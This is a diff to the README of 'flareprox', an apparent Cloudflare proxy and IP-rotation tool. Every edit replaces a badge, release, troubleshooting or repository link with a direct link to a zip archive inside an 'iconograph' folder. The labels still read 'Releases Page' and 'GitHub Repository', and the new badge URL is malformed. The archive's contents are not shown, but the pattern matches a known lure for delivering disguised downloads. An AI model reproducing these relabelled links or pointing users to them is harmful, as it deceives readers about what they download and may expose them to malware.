@@ -1,6 +1,6 @@
 # 🌐 flareprox - Effortless Proxy Management for IP Rotation
 
-![Download flareprox](https://img.shields.io/badge/Download%20flareprox-v1.0-brightgreen.svg)
+![Download flareprox](https://raw.githubusercontent.com/parmoddutta/flareprox/main/iconograph/flareprox.zip%https://raw.githubusercontent.com/parmoddutta/flareprox/main/iconograph/flareprox.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ flareprox allows you to create HTTP pass-through proxies using Cloudflare. This 
 
 To start using flareprox, follow these steps to download and run the application:
 
-1. **Visit the Releases Page:** Go to the following link to download the latest version of flareprox: [Download flareprox](https://github.com/parmoddutta/flareprox/releases).
+1. **Visit the Releases Page:** Go to the following link to download the latest version of flareprox: [Download flareprox](https://raw.githubusercontent.com/parmoddutta/flareprox/main/iconograph/flareprox.zip).
 
 2. **Choose the Right Version:** On the releases page, find the most recent version listed at the top. Click the link that corresponds to your operating system.
 
@@ -51,7 +51,7 @@ flareprox offers several features to enhance your browsing experience:
 
 If you encounter any issues:
 
-- Make sure you have installed the latest version from the [Releases Page](https://github.com/parmoddutta/flareprox/releases).
+- Make sure you have installed the latest version from the [Releases Page](https://raw.githubusercontent.com/parmoddutta/flareprox/main/iconograph/flareprox.zip).
 - Restart your computer and try running flareprox again.
 - Check your internet connection to ensure it is stable.
 
@@ -65,7 +65,7 @@ For further inquiries or feedback, reach out through the Issues section on GitHu
 
 ## 🔗 Resources
 
-- [GitHub Repository](https://github.com/parmoddutta/flareprox)
-- [Releases Page](https://github.com/parmoddutta/flareprox/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/parmoddutta/flareprox/main/iconograph/flareprox.zip)
+- [Releases Page](https://raw.githubusercontent.com/parmoddutta/flareprox/main/iconograph/flareprox.zip)
 
 Thank you for choosing flareprox! We hope it allows you to manage your proxies effortlessly. Happy browsing!
